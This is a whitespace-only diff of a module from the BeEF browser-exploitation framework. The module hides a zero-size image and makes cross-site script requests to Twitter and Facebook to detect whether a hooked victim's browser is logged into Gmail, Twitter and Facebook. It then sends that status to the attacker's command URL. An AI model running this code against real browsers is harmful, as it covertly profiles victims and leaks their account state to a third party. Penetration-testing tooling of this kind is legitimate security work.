@@ -8,11 +8,11 @@ beef.execute(function() {
 
 	var facebookresult = "";
 	var twitterresult = "";
-	
+
 	if (document.getElementById('gmailimg')) {
 		return "Img has already been created";
 	}
-	
+
 	var img = new Image();
 	img.setAttribute("style","visibility:hidden");
 	img.setAttribute("width","0");
@@ -27,9 +27,9 @@ beef.execute(function() {
 		this.setAttribute("attr","load");
 	};
 
-	
+
 	document.body.appendChild(img);
-	
+
 	$j.ajax({
 		url: "https://twitter.com/account/use_phx?setting=false&amp;format=text",
 		dataType: "script",
@@ -43,7 +43,7 @@ beef.execute(function() {
 		},
 		timeout: <%= @timeout %>
 	});
-	
+
 	$j.ajax({
 		url: "https://www.facebook.com/imike3",
 		dataType: "script",
@@ -58,7 +58,7 @@ beef.execute(function() {
 	});
 
 	setTimeout(function() {
-		var img2 = document.getElementById('gmailimg');	
+		var img2 = document.getElementById('gmailimg');
 		if (img2.getAttribute("attr") == "error") {
 			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'gmail=User is NOT authenticated to GMail&twitter='+twitterresult+'&facebook='+facebookresult);
 		} else if (img2.getAttribute("attr") == "load") {
